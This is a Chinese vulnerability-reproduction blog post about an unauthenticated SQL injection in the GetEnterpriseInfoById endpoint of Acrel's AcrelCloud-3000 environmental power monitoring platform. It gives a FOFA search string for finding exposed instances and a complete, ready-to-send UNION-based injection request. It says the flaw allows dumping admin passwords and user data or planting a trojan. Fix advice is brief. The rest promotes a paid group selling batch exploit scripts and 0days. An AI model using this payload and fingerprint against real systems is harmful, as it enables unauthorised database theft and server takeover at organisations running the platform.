#  「漏洞复现」安科瑞环保用电监管云平台 GetEnterpriseInfoById SQL注入漏洞   
冷漠安全  冷漠安全   2024-11-28 05:45  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01   
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
AcrelCloud-3000环保用电监管云平台依托创新的物联网电力传感技术，实时采集企业总用电、生产设备及环保治理设备用电数据，通过关联分析、超限分析、停电分析、停限产分析，结合及时发现环保治理设备未开启、异常关闭及减速、空转、降频等异常情况，同时通过数据分析还可以实时监控限产和停产整治企业运行状态，用户可以利用PC、手机、平板电脑等多种终端实现对平台的访问。  
  
0x03  
  
**漏洞威胁**  
  
安科瑞环保用电监管云平台 GetEnterpriseInfoById 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="myCss/phone.css"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pfhn8RkliaSlNc9wDr4jLAh2TtpjbIlZpAHXdLzX2WibQyPsIjqhtibNLmqibZqicUmSkeeibavETwhwrA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /MainMonitor/GetEnterpriseInfoById?EnterpriseId=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x716a627871%2C0x647a457071654e45644d4c627a716c4d7948505a4d67756a786c70576a5a4f7749627a5449486562%2C0x7178767171%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
联合注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pfhn8RkliaSlNc9wDr4jLAhyjGxGrO70KkUlprOrliaYuzmxVeybbV3HglhPuy6tbvsVWia4nTZAOJg/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pfhn8RkliaSlNc9wDr4jLAhOVlD4rCru3QXhcKCZBqH4rdoTpytGAXhddreibO3x8OS5fsIbG1YODA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pfhn8RkliaSlNc9wDr4jLAhLiaQxlzG0e5qMxEMFhdJx14y2ick01xja3yPEpI8v2GC60LLHtU7Obzg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pfhn8RkliaSlNc9wDr4jLAh05hV211xH6TnJiaVkibZt6CPJ1iaJ2YKGhIoKr5ROo3UJGQvcobK7JGhQ/640?wx_fmt=gif&from=appmsg "")  
  
  
